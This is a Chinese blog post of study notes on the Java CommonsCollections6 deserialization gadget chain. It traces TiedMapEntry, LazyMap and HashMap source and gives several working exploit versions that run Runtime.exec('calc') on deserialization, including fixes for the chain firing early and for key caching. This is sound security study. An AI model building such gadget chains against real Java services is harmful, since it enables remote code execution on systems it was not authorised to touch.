---
title: "cc6链学习"
date: "2026-11-01 21:30:06"
updated: "2026-11-01 21:30:06"
permalink: "2026/11/01/cc6-study/"
categories: ["安全学习", "Java 反序列化"]
tags: ["Java", "反序列化", "CC6"]
description: "围绕 TiedMapEntry、LazyMap 与 HashMap 梳理 CC6 调用链，记录提前触发与键缓存问题。"
excerpt: "围绕 TiedMapEntry、LazyMap 与 HashMap 梳理 CC6 调用链，记录提前触发与键缓存问题。"
obsidian_source: "cc6链学习.md"
---

## 重新开始 CC6 学习

今天正式开始cc6链的学习，前两天面试耽误了几天没学习今天重新开始
首先这个链条可以不受jdk版本的限制了，不过我们还是沿用之前的环境不做修改
首先链尾执行命令的地方还是一样的，还是invoketransformer的transformer，区分在lazymap里get方法的调用来源不同，这里findusage会出现很多调用，这里目前我不知道当年技术人员是怎么找到的，暂时我也没看到技术文章的方法，先暂时留空由以后去解决。

## TiedMapEntry 与 getValue

get方法是追踪到了tiedmapentry里面
```java
/*  
 *  Licensed to the Apache Software Foundation (ASF) under one or more *  contributor license agreements.  See the NOTICE file distributed with *  this work for additional information regarding copyright ownership. *  The ASF licenses this file to You under the Apache License, Version 2.0 *  (the "License"); you may not use this file except in compliance with *  the License.  You may obtain a copy of the License at * *      http://www.apache.org/licenses/LICENSE-2.0 * *  Unless required by applicable law or agreed to in writing, software *  distributed under the License is distributed on an "AS IS" BASIS, *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. *  See the License for the specific language governing permissions and *  limitations under the License. */package org.apache.commons.collections.keyvalue;  
  
import java.io.Serializable;  
import java.util.Map;  
  
import org.apache.commons.collections.KeyValue;  
  
/**  
 * A {@link java.util.Map.Entry Map.Entry} tied to a map underneath.  
 * <p>  
 * This can be used to enable a map entry to make changes on the underlying  
 * map, however this will probably mess up any iterators. * * @since Commons Collections 3.0  
 * @version $Revision: 646777 $ $Date: 2008-04-10 13:33:15 +0100 (Thu, 10 Apr 2008) $  
 ** @author Stephen Colebourne  
 */public class TiedMapEntry implements Map.Entry, KeyValue, Serializable {  
  
    /** Serialization version */      
private static final long serialVersionUID = -8453869361373831205L;  
  
    /** The map underlying the entry/iterator */      
private final Map map;  
    /** The key */  
    private final Object key;  
  
    /**  
     * Constructs a new entry with the given Map and key.     *     * @param map  the map  
     * @param key  the key  
     */    public TiedMapEntry(Map map, Object key) {  
        super();  
        this.map = map;  
        this.key = key;  
    }  
  
    // Map.Entry interface  
    //-------------------------------------------------------------------------    /**  
     * Gets the key of this entry     ** @return the key  
     */    public Object getKey() {  
        return key;  
    }  
  
    /**  
     * Gets the value of this entry direct from the map.     ** @return the value  
     */    public Object getValue() {  
        return map.get(key);  
    }  
  
    /**  
     * Sets the value associated with the key direct onto the map.     ** @param value  the new value  
     * @return the old value  
     * @throws IllegalArgumentException if the value is set to this map entry  
     */    public Object setValue(Object value) {  
        if (value == this) {  
            throw new IllegalArgumentException("Cannot set value to this map entry");  
        }  
        return map.put(key, value);  
    }  
  
    /**  
     * Compares this <code>Map.Entry</code> with another <code>Map.Entry</code>.  
     * <p>  
     * Implemented per API documentation of {@link java.util.Map.Entry#equals(Object)}  
     ** @param obj  the object to compare to  
     * @return true if equal key and value  
     */    public boolean equals(Object obj) {  
        if (obj == this) {  
            return true;  
        }  
        if (obj instanceof Map.Entry == false) {  
            return false;  
        }  
        Map.Entry other = (Map.Entry) obj;  
        Object value = getValue();  
        return  
            (key == null ? other.getKey() == null : key.equals(other.getKey())) &&  
            (value == null ? other.getValue() == null : value.equals(other.getValue()));  
    }  
  
    /**  
     * Gets a hashCode compatible with the equals method.     * <p>  
     * Implemented per API documentation of {@link java.util.Map.Entry#hashCode()}  
     ** @return a suitable hash code  
     */    public int hashCode() {  
        Object value = getValue();  
        return (getKey() == null ? 0 : getKey().hashCode()) ^  
               (value == null ? 0 : value.hashCode());   
    }  
  
    /**  
     * Gets a string version of the entry.     ** @return entry as a string  
     */    public String toString() {  
        return getKey() + "=" + getValue();  
    }  
  
}
```
这个代码不长我们可以简单分析一下，现在我很喜欢看java代码这个过程
这里定义了一个键值对的对象，里面的构造方法是公共的可以直接进行构造，终于不要用反射了，还定义了键值对的相关方法，比如判断键值对是否相等，获取value，设置vlaue等功能。
我们发现这里的getvalue会调用get方法，我们先写一个简单的exp尝试一下

```java
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.keyvalue.TiedMapEntry;  
import org.apache.commons.collections.map.LazyMap;  
  
import javax.xml.crypto.dsig.Transform;  
import java.util.HashMap;  
import java.util.Map;  
  
public class cc2 {  
    public static void main(String[] args) throws Exception {  
        HashMap<Object, Object> objectObjectHashMap = new HashMap<>();  
//        Runtime runtime = Runtime.getRuntime();  
//        InvokerTransformer exec = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});  
        Transformer[] transformers = {  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),  
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})  
        };  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
  
  
        Map decorate = LazyMap.decorate(objectObjectHashMap, chainedTransformer);  
        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,"niao");  
        tiedMapEntry.getValue();  
  
  
    }  
}
```
我写完这个链条之后一开始有点不理解，我们这个entry的key是一个字符串，调用getvalue方法之后调用lazymap的get方法，然后在get方法中又调用了transform方法，那这样不是字符串作为input吗，那他应该是获取到string类型的Class啊。后来发现我对其中的对象没有搞清楚，lazymap盗用transform方法的时候这个对象是chaintransformer，没有直接进入invoketransformer当中，所以首先先把输入变成Runtime.class，这个问题前面我们已经解释过了，到这里又想不通了，接下来我们继续，看谁调用了getvalue
```java
public int hashCode() {  
    Object value = getValue();  
    return (getKey() == null ? 0 : getKey().hashCode()) ^  
           (value == null ? 0 : value.hashCode());   
}
```

## hashCode 与 HashMap 入口

刚才在看代码的时候特地留了一段没讲，就是hashcode这个方法，这是我们接下来的关键，刚才找getvalue的调用发现有非常多的调用，不知道当年的大佬是怎么发现的换成我估计就放弃了，看博客说在这里优先看同类中是否有调用的，果然在hashcode中调用了这个方法。我们简单介绍一下这段代码，首先获得key对应的value，然后对key和value分别进行hashcode的计算如果为空就设为0，然后再对二者做异或运算。
看博主说到了这一步如果在实战中遇到了hashcode基本上可以开香槟了，接下来还有比较完善的链条思路，首先hashmap中的hash方法使用了hashcode，put调用了hash，代码放在下面了
```java
static final int hash(Object key) {  
    int h;  
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);  
}
```
```java
public V put(K key, V value) {  
    return putVal(hash(key), key, value, false, true);  
}
```
同样在hashmap中的readobject中会进行hash的运算，这也是一个很好的入口类，
```java
private void readObject(java.io.ObjectInputStream s)  
    throws IOException, ClassNotFoundException {  
    // Read in the threshold (ignored), loadfactor, and any hidden stuff  
    s.defaultReadObject();  
    reinitialize();  
    if (loadFactor <= 0 || Float.isNaN(loadFactor))  
        throw new InvalidObjectException("Illegal load factor: " +  
                                         loadFactor);  
    s.readInt();                // Read and ignore number of buckets  
    int mappings = s.readInt(); // Read number of mappings (size)  
    if (mappings < 0)  
        throw new InvalidObjectException("Illegal mappings count: " +  
                                         mappings);  
    else if (mappings > 0) { // (if zero, use defaults)  
        // Size the table using given load factor only if within        // range of 0.25...4.0        float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);  
        float fc = (float)mappings / lf + 1.0f;  
        int cap = ((fc < DEFAULT_INITIAL_CAPACITY) ?  
                   DEFAULT_INITIAL_CAPACITY :  
                   (fc >= MAXIMUM_CAPACITY) ?  
                   MAXIMUM_CAPACITY :  
                   tableSizeFor((int)fc));  
        float ft = (float)cap * lf;  
        threshold = ((cap < MAXIMUM_CAPACITY && ft < MAXIMUM_CAPACITY) ?  
                     (int)ft : Integer.MAX_VALUE);  
        @SuppressWarnings({"rawtypes","unchecked"})  
            Node<K,V>[] tab = (Node<K,V>[])new Node[cap];  
        table = tab;  
  
        // Read the keys and values, and put the mappings in the HashMap  
        for (int i = 0; i < mappings; i++) {  
            @SuppressWarnings("unchecked")  
                K key = (K) s.readObject();  
            @SuppressWarnings("unchecked")  
                V value = (V) s.readObject();  
            ==🔵putVal(hash(key), key, value, false, false);==  
        }  
    }  
}
```


## 串起反序列化实验

```java
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.keyvalue.TiedMapEntry;  
import org.apache.commons.collections.map.LazyMap;  
  
import javax.xml.crypto.dsig.Transform;  
import java.util.HashMap;  
import java.util.Map;  
  
public class cc2 {  
    public static void main(String[] args) throws Exception {  
        HashMap<Object, Object> objectObjectHashMap = new HashMap<>();  
//        Runtime runtime = Runtime.getRuntime();  
//        InvokerTransformer exec = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});  
        Transformer[] transformers = {  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),  
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})  
        };  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
  
  
        Map decorate = LazyMap.decorate(objectObjectHashMap, chainedTransformer);  
        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,"niao");  
//        tiedMapEntry.getValue();  
        HashMap<Object, Object> cc2hashmap = new HashMap<>();  
        cc2hashmap.put(tiedMapEntry,"thankyou");  
  
  
    }  
}
```
可以弹计算机

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class cc2 {

    public static void main(String[] args) throws Exception {

        // 1. 构造恶意 Transformer 链
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, null}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{"calc"})
        };
        // 先用一个无害的链填充，put 完成后再通过反射换成恶意链，避免 put 时就触发
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{});

        // 2. 用 LazyMap 装饰 HashMap
        Map<Object, Object> innerMap = new HashMap<>();
        Map<Object, Object> lazyMap = LazyMap.decorate(innerMap, chainedTransformer);

        // 3. TiedMapEntry 持有 lazyMap，key 任意
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "niao");

        // 4. 外层 HashMap：put 时会调用 key.hashCode()
        HashMap<Object, Object> cc2hashmap = new HashMap<>();
        cc2hashmap.put(tiedMapEntry, "thankyou");

        // 5. 关键坑：put 时 TiedMapEntry.hashCode() 会调用 lazyMap.get("niao")，
        //    LazyMap 会把 "niao" 作为 key 放进 innerMap（即使没触发 transform 也会占位）。
        //    这样反序列化时 TiedMapEntry.hashCode() 再次 get 会命中缓存，不会调用 transform。
        //    因此必须把 innerMap 里的 "niao" 删掉。
        innerMap.remove("niao");

        // 6. 反射把恶意链写回 ChainedTransformer 的 iTransformers 字段
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(chainedTransformer, transformers);

        // 7. 序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(cc2hashmap);
        oos.close();
        byte[] payload = baos.toByteArray();

        // 8. 反序列化（触发计算器）
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(payload));
        ois.readObject();
    }
}
```

## 实验修正与最终代码

这是最终的exp，可以看到DeepSeek进行了一些修改，我们反思一下

很严重的问题我们不进行序列化反序列化他就执行命令了，我们执行put的时候依次执行hash，hashcode，getvalue，get，到get这一步的时候对象是lazymap，确定key是没有被保存过的就执行get然后再执行transform他出计算器，这个流程我们预想应该发生在反序列化的时候。然后map保存之后key就存在在hashmap里了。
```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.crypto.dsig.Transform;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class cc2 {
    public static void main(String[] args) throws Exception {
        HashMap<Object, Object> objectObjectHashMap = new HashMap<>();
//        Runtime runtime = Runtime.getRuntime();
//        InvokerTransformer exec = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
        Transformer[] transformers = {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{new ConstantTransformer("This is fake!!!")});


        Map decorate = LazyMap.decorate(objectObjectHashMap, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,"niao");
//        tiedMapEntry.getValue();
        HashMap<Object, Object> cc2hashmap = new HashMap<>();
        cc2hashmap.put(tiedMapEntry,"thankyou");
        objectObjectHashMap.remove("niao");
        Field iTransformers = ChainedTransformer.class.getDeclaredField("iTransformers");
        iTransformers.setAccessible(true);
        iTransformers.set(chainedTransformer,transformers);

        // 序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(cc2hashmap);
        oos.close();

        // 反序列化（触发）
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));
        ois.readObject();

    }
}
```
这是我最终完成的exp，修改了两个问题，一个是在put之后niao就被保存咋hashmap中了导致反序列化不会执行命令。另外一个就是保证在反序列化之前不执行命令保证链条的干净流畅性，所以我们put的是一个干净的chaintransformer，put之后我们通过反射把这个chaintransformer修改成恶意的，保证在反序列化的过程中可以执行。这一切的重点都在lazymap的get方法那里，如果以后想不起来了就去看这个代码。



## 学习回顾

好的最后时间我们来总结一下我们的学习成果，首先链尾相比之前没有变化还是从invoketransformer出发，通过他的transform方法我们找到了lazymap的get方法调用了，然后接着找我们发信啊tiedmapentry里面的getvalue方法调用了get，然后同类中的hashcode调用了getvalue，然后hashmap里面的put调用了hash，hash调用了hashcode，这样的话我么就连成一条完整的线了。

在分析过程中要充分考虑java的多态这个特点，这是我们分析的关键也是不可缺少的思维。学完cc1之后果然学cc6快了很多。据听说cc6是最常用的链条。

---

**本系列笔记：** [Java安全学习](/2026/11/01/java-security-urldns/) · [Java 反序列化漏洞：CommonsCollections1（CC1）学习笔记](/2026/11/01/cc1-study-notes/) · [cc1链学习](/2026/11/01/cc1-transformedmap/) · [正版cc1链学习](/2026/11/01/cc1-lazymap/) · [cc3链学习](/2026/11/01/cc3-classloading/) · [cc6链学习](/2026/11/01/cc6-study/) · [cc4链的学习](/2026/11/06/cc4-study/) · [cc2学习](/2026/11/10/cc2-study/)
